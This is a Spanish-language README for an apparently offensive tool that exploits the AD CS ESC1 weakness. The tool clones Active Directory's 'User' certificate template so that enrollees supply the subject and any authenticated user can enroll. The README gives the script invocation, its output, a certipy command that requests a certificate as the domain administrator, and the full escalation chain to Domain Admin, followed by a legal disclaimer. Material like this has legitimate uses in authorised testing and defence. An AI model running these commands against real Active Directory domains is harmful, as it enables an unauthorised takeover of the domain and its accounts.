# AD CS ESC1 - Clonar Template de Certificado para Escalacion de Privilegios

## Descripcion

Desarrolle este script para explotar la vulnerabilidad ESC1 en Active Directory Certificate Services (AD CS). El script clona el template "User" existente y crea uno nuevo con `msPKI-Certificate-Name-Flag = 1` (enrollee supplies subject), lo que permite solicitar certificados en nombre de cualquier usuario del dominio, incluyendo administradores.

## Como funciona

1. **Conexion LDAP**: Se conecta al Domain Controller via LDAPS con credenciales de dominio
2. **Creacion de OID**: Genera un objeto msPKI-Enterprise-Oid unico requerido para el template
3. **Clonacion del template**: Copia todos los atributos del template "User" y modifica los criticos:
   - `msPKI-Certificate-Name-Flag = 1` → permite especificar el Subject (ESC1)
   - `msPKI-Enrollment-Flag = 0` → sin aprobacion del manager
   - `pKIExtendedKeyUsage` → Client Authentication
4. **Configuracion de ACLs**: Establece permisos para que Authenticated Users puedan enrollarse

## Requisitos

```bash
pip install ldap3 impacket
```

## Uso

```bash
python3 adcs-esc1-clone-certificate-template-privesc.py <DC_IP> <dominio> <usuario> <password> <nombre_template> [SID_owner]
```

### Ejemplo

```bash
python3 adcs-esc1-clone-certificate-template-privesc.py 10.10.10.1 corp.local user1 'P@ssw0rd' MiTemplate
```

## Ejemplo de salida

```
[+] bound
[i] OID: 1.3.6.1.4.1.311.21.8.123456.789012.1234567 :: ok
[+] template cloned
```

## Siguiente paso

Despues de crear el template, se puede usar `certipy` para solicitar un certificado como administrador:

```bash
certipy req -u user1@corp.local -p 'P@ssw0rd' -ca CORP-CA -template MiTemplate -upn administrator@corp.local
```

## Cadena de ataque completa

```
Credenciales de dominio → Clonar template con ESC1 →
Solicitar certificado como admin → Autenticarse con el certificado →
NTLM hash del administrador → Domain Admin
```

## Aviso legal

Este script es unicamente para pruebas de seguridad autorizadas y fines educativos. Siempre obtene la autorizacion correspondiente antes de testear contra cualquier sistema.

## Autor

**Alan Newberry**
